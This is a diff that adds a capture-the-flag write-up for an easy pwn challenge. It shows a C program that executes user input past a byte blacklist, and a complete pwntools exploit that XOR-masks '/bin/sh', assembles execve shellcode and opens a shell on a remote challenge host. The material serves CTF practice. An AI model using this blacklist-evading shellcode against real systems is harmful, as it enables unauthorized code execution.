@@ -147,3 +147,148 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+# Execute
+
+## Difficulty
+
+- EASY
+
+## Description
+
+> Can you feed the hungry code?
+
+## Write-up
+
+保护全开，但是栈可执行。
+
+```c del={43} ins={16-25, 38-41}
+// gcc execute.c -z execstack -o execute
+
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void setup() {
+  setvbuf(stdin, NULL, _IONBF, 0);
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stderr, NULL, _IONBF, 0);
+  alarm(0x7f);
+}
+
+int check(char *blacklist, char *buf, int read_size, int blacklist_size) {
+  for (int i = 0; i < blacklist_size; i++) {
+    for (int j = 0; j < read_size - 1; j++) {
+      if (blacklist[i] == buf[j])
+        return 0;
+    }
+  }
+
+  return 1337;
+}
+
+int main() {
+  char buf[62];
+  char blacklist[] =
+      "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";
+
+  setup();
+
+  puts("Hey, just because I am hungry doesn't mean I'll execute everything");
+
+  int size = read(0, buf, 60);
+
+  if (!check(blacklist, buf, size, strlen(blacklist))) {
+    puts("Hehe, told you... won't accept everything");
+    exit(1337);
+  }
+
+  ((void (*)())buf)();
+}
+```
+
+程序对我们的输入做了一个检查，禁用了一些字节，除此以外没有太多限制。所以思路还是打 shellcode.
+
+关于 mask 的爆破，利用了 `a ^ b ^ b = a` 的性质。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    asm,
+    context,
+    disasm,
+    log,
+    p64,
+    process,
+    raw_input,
+    remote,
+    u64,
+)
+
+FILE = "./execute"
+HOST, PORT = "94.237.54.192", 31583
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    blacklist = set(b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67")
+    mask = b""
+    target_string = u64(b"/bin/sh".ljust(0x8, b"\x00"))
+
+    for byte in range(0, 0x100):
+        mask = int(f"{byte:02x}" * 8, 16)
+        encoded = p64(mask ^ target_string)
+
+        if all(byte not in blacklist for byte in encoded):
+            log.success(f"Found mask: {hex(mask)}")
+            break
+
+    payload = asm(f"""
+        mov rax, {mask}
+        push rax
+        mov rax, {mask} ^ {target_string}
+        xor [rsp], rax
+        mov rdi, rsp
+        push 0
+        pop rsi
+        push 0
+        pop rdx
+        mov rbx, 0x3a
+        inc rbx
+        mov rax, rbx
+        syscall
+    """)
+
+    log.success(disasm(payload))
+
+    for byte in payload:
+        if byte in blacklist:
+            log.warn(f"Bad byte: {byte:2x}")
+
+    # raw_input("DEBUG")
+    target.sendline(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
